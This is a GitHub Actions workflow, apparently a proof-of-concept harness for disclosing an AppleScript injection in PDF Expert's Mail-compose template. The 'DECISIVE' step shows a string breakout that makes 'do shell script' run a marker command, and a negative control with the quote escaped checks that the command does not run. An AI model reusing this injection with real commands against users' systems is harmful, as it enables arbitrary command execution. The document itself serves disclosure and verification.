name: pdfexpert-poc

on:
  workflow_dispatch:

jobs:
  poc:
    runs-on: macos-latest
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@v4

      - name: Host
        run: sw_vers; uname -m

      - name: Fetch PDF Expert 1187 from the vendor feed
        run: |
          set -euo pipefail
          curl -fsSL -o pex.zip https://downloads.pdfexpert.com/pem3/versions/1187/PDFExpert.zip
          shasum -a 256 pex.zip | tee zip.sha256
          unzip -q pex.zip -d app
          ls -l "app/PDF Expert.app/Contents/MacOS/PDF Expert"

      - name: Template literals present in the shipped bytes
        run: python3 poc/verify_binary.py "app/PDF Expert.app/Contents/MacOS/PDF Expert"

      - name: Build the script from the binary's own literals
        run: |
          set -euo pipefail
          python3 poc/gen_poc.py --binary "app/PDF Expert.app/Contents/MacOS/PDF Expert" \
            --cmd "id > /tmp/pdfe_pwned" --field body > generated.scpt
          echo "--- wc ---"; wc -l generated.scpt
          echo "--- numbered ---"; nl -ba generated.scpt
          echo "--- tokenizer ---"; python3 poc/verify_tokenlevel.py generated.scpt
          echo "--- compile check ---"
          osacompile -o /tmp/gen.scpt generated.scpt && echo "COMPILE OK" || echo "COMPILE FAILED"

      - name: DECISIVE - minimal script, same construction, same sink
        run: |
          set +e
          rm -f /tmp/pdfe_mini
          printf '%s\n' \
            'tell application "Mail"' \
            'set newMessage to make new outgoing message with properties {subject:"Invoice", content:"x" & do shell script "id > /tmp/pdfe_mini" & "" & linefeed & linefeed}' \
            'end tell' > mini.scpt
          nl -ba mini.scpt
          osacompile -o /tmp/mini.scpt mini.scpt && echo "MINI COMPILE OK" || echo "MINI COMPILE FAILED"
          osascript mini.scpt > mini.out 2>&1 &
          PID=$!
          for i in $(seq 1 20); do [ -s /tmp/pdfe_mini ] && break; sleep 1; done
          kill $PID 2>/dev/null
          echo "--- mini output ---"; cat mini.out
          echo "--- mini marker ---"; cat /tmp/pdfe_mini 2>/dev/null
          if [ -s /tmp/pdfe_mini ]; then echo "MINI PROOF: do shell script executed"; else echo "MINI NO PROOF"; fi

      - name: NEGATIVE CONTROL - same line, quote escaped
        run: |
          set +e
          rm -f /tmp/pdfe_ctl
          printf '%s\n' \
            'tell application "Mail"' \
            'set newMessage to make new outgoing message with properties {subject:"Invoice", content:"x\" & do shell script \"id > /tmp/pdfe_ctl\" & \"" & linefeed & linefeed}' \
            'end tell' > ctl.scpt
          nl -ba ctl.scpt
          osacompile -o /tmp/ctl.scpt ctl.scpt && echo "CTL COMPILE OK" || echo "CTL COMPILE FAILED"
          osascript ctl.scpt > ctl.out 2>&1 &
          PID=$!
          for i in $(seq 1 15); do [ -s /tmp/pdfe_ctl ] && break; sleep 1; done
          kill $PID 2>/dev/null
          echo "--- ctl output ---"; cat ctl.out
          if [ -s /tmp/pdfe_ctl ]; then echo "CONTROL FAILED: escaped payload executed"; else echo "CONTROL OK: escaped payload did not execute"; fi

      - name: Collect
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: evidence
          path: |
            generated.scpt
            mini.scpt
            ctl.scpt
            mini.out
            ctl.out
            zip.sha256
            /tmp/pdfe_mini
            /tmp/pdfe_ctl
          if-no-files-found: warn
